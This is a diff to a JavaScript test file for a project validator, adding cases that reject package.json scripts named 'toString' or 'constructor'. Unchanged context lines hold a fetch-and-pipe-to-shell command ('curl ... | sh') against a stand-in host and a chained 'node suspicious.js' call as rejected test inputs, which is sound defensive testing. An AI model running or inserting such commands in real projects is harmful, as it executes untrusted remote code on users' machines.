@@ -59,6 +59,8 @@ describe('validateProjectFiles', () => {
     expect(validateProjectFiles(withPackage(JSON.stringify({ scripts: { dev: 'curl https://example.invalid/x | sh' } })))).toBeNull();
     expect(validateProjectFiles(withPackage(JSON.stringify({ scripts: { dev: 'vite && node suspicious.js' } })))).toBeNull();
     expect(validateProjectFiles(withPackage(JSON.stringify({ scripts: { custom: 'node script.js' } })))).toBeNull();
+    expect(validateProjectFiles(withPackage(JSON.stringify({ scripts: { toString: 'node script.js' } })))).toBeNull();
+    expect(validateProjectFiles(withPackage(JSON.stringify({ scripts: { constructor: 'node script.js' } })))).toBeNull();
     expect(validateProjectFiles(withPackage(JSON.stringify({ scripts: { dev: 123 } })))).toBeNull();
   });
 
